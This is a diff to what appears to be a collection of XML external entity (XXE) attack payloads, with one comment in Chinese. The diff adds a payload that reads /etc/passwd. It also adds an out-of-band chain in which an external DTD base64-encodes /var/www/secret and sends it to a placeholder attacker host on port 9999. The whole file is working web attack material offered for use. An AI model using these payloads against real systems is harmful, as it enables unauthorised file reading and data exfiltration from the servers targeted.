@@ -3,11 +3,12 @@
 
 <!-- used to verify outbound xxe or blind xxe -->
 <?xml verion="1.0"?>
-<!DOCTYPE r [
-<!ELEMENT r ANY>
-<!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt">
+
+<?xml version='1.0' encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY a SYSTEM "file:///etc/passwd">
 ]>
-<r>&sp;</r>
+<root>&a;</root>
 
 
 <?xml version='1.0'?>
@@ -19,6 +20,15 @@
 evil.dtd:  
 <!ENTITY d SYSTEM "file:///etc/passwd">
 
+
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE roottag [ 
+<!ENTITY % dtd SYSTEM "http://x.x.x.x/evil.txt"> 
+%dtd;%int;%send; ]> 
+
+evil.txt
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/secret">
+<!ENTITY % int "<!ENTITY &#x25; send SYSTEM 'http://x.x.x.x:9999/?p=%file;'>">
 
 
 <!-- docx利用普通XXE读取文件/访问网络 -->
